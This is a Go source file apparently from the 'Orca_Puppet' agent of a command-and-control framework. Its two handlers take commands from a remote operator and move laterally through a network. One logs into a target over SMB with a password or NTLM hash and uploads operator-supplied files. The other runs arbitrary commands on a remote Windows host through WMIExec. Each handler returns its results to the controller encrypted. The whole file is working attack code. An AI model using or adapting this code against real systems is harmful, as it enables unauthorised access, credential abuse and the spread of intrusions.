package controller

import (
	"Orca_Puppet/cli/cmdopt/smbopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	common2 "Orca_Puppet/pkg/psexec/common"
	v5 "Orca_Puppet/pkg/psexec/dcerpc/v5"
	"Orca_Puppet/pkg/psexec/smb/smb2"
	"Orca_Puppet/pkg/wmiexec/wmiexec"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func smbUploadCmd(sendUserId, decData string) {
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	var msUploadStruct smbopt.SmbUploadStruct
	err := json.Unmarshal([]byte(decData), &msUploadStruct)
	if err != nil {
		return
	}
	username := msUploadStruct.SmbStruct.User
	password := msUploadStruct.SmbStruct.Pwd
	hash := msUploadStruct.SmbStruct.Hash
	domain := msUploadStruct.SmbStruct.Domain
	ip, sPort, _ := strings.Cut(msUploadStruct.SmbStruct.Host, ":")
	port, _ := strconv.Atoi(sPort)
	fileMetaInfo := msUploadStruct.FileMetaInfo
	saveFile := fileMetaInfo.SaveFileName
	sliceNum := fileMetaInfo.SliceNum
	md5sum := fileMetaInfo.Md5sum
	debugs := debug.IsDebug

	pSaveFile, _ := os.OpenFile(saveFile, os.O_CREATE|os.O_RDWR, 0600)
	abs, _ := filepath.Abs(saveFile)
	defer os.Remove(abs)
	defer pSaveFile.Close()

	// 循环获取分片数据
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			pSaveFile.Write(metaData.([]byte))
		case <-time.After(5 * time.Second):
			common.SendFailMsg(sendUserId, common.ClientId, "file upload failed", "")
			debug.DebugPrint(sendUserId + " upload file error")
			setchannel.DeleteFileSliceDataChan(sendUserId)
			return
		}
	}

	saveFileMd5 := util.GetFileMd5Sum(saveFile)
	if md5sum == saveFileMd5 {
		options := common2.ClientOptions{
			Host:     ip,
			Port:     port,
			User:     username,
			Password: password,
			Hash:     hash,
			Domain:   domain,
		}
		session, err := smb2.NewSession(options, debugs)
		if err != nil {
			msg := fmt.Sprintf("Login failed [%s]: %s", ip, err.Error())
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, msg)
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
			return
		}
		defer session.Close()

		authMsg := ""
		if session.IsAuthenticated {
			msg := fmt.Sprintf("Login successful [%s]", ip)
			authMsg = colorcode.OutputMessage(colorcode.SIGN_SUCCESS, msg)
		}
		rpc, err := v5.SMBTransport()
		if err != nil {
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "rpc connection establishment failed")
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
			return
		}
		rpc.Client = *session
		err = rpc.FileUpload(saveFile, "./")
		if err != nil {
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
			return
		}
		data := authMsg + colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "file upload success")
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
	} else {
		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "file upload failed")
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "smbUpload_ret", outputMsg)
	}
}

func smbExecCmd(sendUserId, decData string) {
	var msExecStruct smbopt.SmbExecStruct
	json.Unmarshal([]byte(decData), &msExecStruct)
	username := msExecStruct.SmbStruct.User
	password := msExecStruct.SmbStruct.Pwd
	hash := msExecStruct.SmbStruct.Hash
	domain := msExecStruct.SmbStruct.Domain
	ip, _, _ := strings.Cut(msExecStruct.SmbStruct.Host, ":")
	target := fmt.Sprintf("%s:%d", ip, 135)
	cmd := msExecStruct.Command
	clientHost, _ := os.Hostname()
	binding := ""
	var err error
	var out string
	c := make(chan string)
	go func() {
		err, out = wmiexec.WMIExec(target, username, password, hash, domain, cmd, clientHost, binding, nil)
		c <- out
	}()
	select {
	case <-c:
		if err != nil {
			message := fmt.Sprintf("failed to run shell: %v", err)
			output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
			var retData, _ = crypto.Encrypt([]byte(output), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
			return
		}
		debug.DebugPrint(out)
	case <-time.After(5 * time.Second):
		message := fmt.Sprintf("command execution timed out")
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		var retData, _ = crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
		return
	}
	output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "command executed successfully")
	retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
}
